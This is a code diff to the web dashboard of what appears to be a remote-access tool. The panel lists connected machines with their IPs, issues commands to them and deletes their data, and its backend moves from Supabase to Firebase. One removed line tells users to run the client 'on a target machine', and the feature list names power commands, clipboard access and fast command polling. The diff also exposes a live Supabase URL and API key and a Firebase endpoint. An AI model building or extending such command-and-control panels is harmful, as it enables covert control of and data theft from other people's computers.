@@ -39,7 +39,6 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
 .stat-card:hover{border-color:#30363d;transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,0,0,.4)}
 .stat-card .num{font-size:1.8rem;font-weight:700;color:#f0f6fc;line-height:1.2}
 .stat-card .lbl{color:#8b949e;font-size:.82rem;margin-top:.2rem}
-.stat-card .stat-icon{position:absolute;right:1rem;top:50%;transform:translateY(-50%);font-size:1.8rem;opacity:.08;color:#58a6ff}
 .stat-card.online .num{color:#3fb950}
 .client-list{display:flex;flex-direction:column;gap:.4rem}
 .client-card{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #21262d;border-radius:10px;padding:.85rem 1rem;display:flex;align-items:center;gap:1rem;transition:all .2s;animation:slideIn .25s ease}
@@ -198,16 +197,13 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
       <li>System power commands</li>
       <li>Clipboard, idle, uptime</li>
       <li>50ms command polling</li>
-      <li>Direct Supabase REST API</li>
+      <li>Firebase Realtime Database</li>
     </ul>
   </div>
 </div>
 
 <script>
-const SB='https://odocuexiouhmmkpwtuwk.supabase.co';
-const KEY='sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED';
-const H={headers:{apikey:KEY,Authorization:'Bearer '+KEY}};
-const PH={apikey:KEY,Authorization:'Bearer '+KEY,'Content-Type':'application/json'};
+const FB='https://solix-710c0-default-rtdb.europe-west1.firebasedatabase.app';
 let latest={};
 
 load();
@@ -222,29 +218,23 @@ function switchPage(name,el){
 
 async function load(){
  try{
-  const r=await fetch(SB+'/rest/v1/pings?order=id.desc&limit=200',H);
+  const r=await fetch(FB+'/pings.json');
   if(!r.ok)return;
-  const p=await r.json();
-  if(!Array.isArray(p))return;
-  latest={};
-  p.forEach(x=>{if(!latest[x.computer])latest[x.computer]=x});
-  const names=Object.keys(latest);
+  const d=await r.json();
+  if(!d||typeof d!=='object'){document.getElementById('clientList').innerHTML='<div class="empty-state"><div class="empty-icon">[ ]</div><h3>No Clients Connected</h3><p>Download and run the client to see it appear here.</p></div>';return;}
+  const names=Object.keys(d);
   const now=Date.now();
-  const online=names.filter(n=>now-new Date(latest[n].created_at).getTime()<60000);
+  const online=names.filter(n=>{const t=d[n]&&d[n].created_at;return t&&now-new Date(t).getTime()<60000;});
   document.getElementById('onlineCount').textContent=online.length;
   document.getElementById('totalCount').textContent=names.length;
-  if(p.length){
-   document.getElementById('lastPing').textContent=new Date(p[0].created_at).toLocaleTimeString();
-   const today=new Date();today.setHours(0,0,0,0);
-   document.getElementById('activeToday').textContent=names.filter(n=>new Date(latest[n].created_at).getTime()>today.getTime()).length;
-  }
+  const allTs=names.map(n=>d[n]&&d[n].created_at).filter(Boolean).sort().reverse();
+  if(allTs.length)document.getElementById('lastPing').textContent=new Date(allTs[0]).toLocaleTimeString();
+  const today=new Date();today.setHours(0,0,0,0);
+  document.getElementById('activeToday').textContent=names.filter(n=>{const t=d[n]&&d[n].created_at;return t&&new Date(t).getTime()>today.getTime();}).length;
   const list=document.getElementById('clientList');
-  if(!names.length){
-   list.innerHTML='<div class="empty-state"><div class="empty-icon">[ ]</div><h3>No Clients Connected</h3><p>Download and run the client on a target machine to see it appear here.</p></div>';
-   return;
-  }
   list.innerHTML=names.map((n,i)=>{
-   const x=latest[n];const age=now-new Date(x.created_at).getTime();const isOnline=age<60000;
+   const x=d[n];if(!x)return'';
+   const age=now-new Date(x.created_at).getTime();const isOnline=age<60000;
    const ip=x.ip||'?';const ts=new Date(x.created_at).toLocaleString();
    return '<div class="client-card" style="animation-delay:'+(i*0.04)+'s"><div class="dot '+(isOnline?'online':'offline')+'"></div><div class="info"><div class="name">'+esc(n)+' <span style="font-size:.72rem;color:#8b949e;font-weight:400">'+esc(ip)+'</span></div><div class="meta"><span>Last: '+ts+'</span><span style="color:'+(isOnline?'#3fb950':'#484f58')+'">'+(isOnline?'Online':'Offline')+'</span></div></div><div class="actions"><button class="btn btn-accent btn-sm" onclick="openClient(\''+escAttr(n)+'\')">Open</button><button class="btn btn-danger btn-sm" onclick="removeClient(\''+escAttr(n)+'\')">Remove</button></div></div>';
   }).join('');
@@ -259,8 +249,9 @@ function downloadClient(){window.location.href='https://github.com/dustinhemert-
 async function removeClient(name){
  if(!confirm('Remove '+name+' and all its data?'))return;
  try{
-  await fetch(SB+'/rest/v1/pings?computer=eq.'+encodeURIComponent(name),{method:'DELETE',headers:PH});
-  await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(name),{method:'DELETE',headers:PH});
+  await fetch(FB+'/pings/'+encodeURIComponent(name)+'.json',{method:'DELETE'});
+  await fetch(FB+'/commands/'+encodeURIComponent(name)+'.json',{method:'DELETE'});
+  await fetch(FB+'/live/'+encodeURIComponent(name)+'.json',{method:'DELETE'});
   await load();
  }catch{}
 }
